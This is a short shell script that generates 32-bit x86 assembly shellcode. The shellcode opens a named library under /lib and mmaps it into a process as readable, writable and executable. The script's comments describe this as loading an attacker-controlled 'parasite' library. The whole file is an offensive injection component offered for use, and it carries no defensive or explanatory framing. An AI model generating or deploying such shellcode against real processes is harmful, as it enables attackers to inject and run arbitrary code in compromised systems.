#!/bin/sh
#
# This scripts generates shellcode to mmap() a 
# shared library under an attacker's control
#
# ARG1: the parasite library's name

usage () {
	echo "$0 <lib name>"
}

if [ "$#" -ne 1 ]; then
	usage
	exit 1
fi


echo "_start:"
echo "call 1f"
echo ".string \"/lib/$1\""
# fd = open("<lib>", O_RDONLY);
echo "1:"
echo "pop %ebx"
echo "movb \$5, %al"
echo "xorl %ecx, %ecx"
echo "int \$0x80"
#echo "int3"
echo "subl \$24, %esp"
# mmap(0, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0);
echo "xorl %edx, %edx"
echo "movl %edx, (%esp)"
echo "movl \$8192,4(%esp)"
echo "movl \$7, 8(%esp)" 
echo "movl \$2, 12(%esp)"
echo "movl %eax,16(%esp)"
echo "movl %edx, 20(%esp)"
echo "movl \$90, %eax"
echo "movl %esp, %ebx"
echo "int \$0x80"
echo "int3"
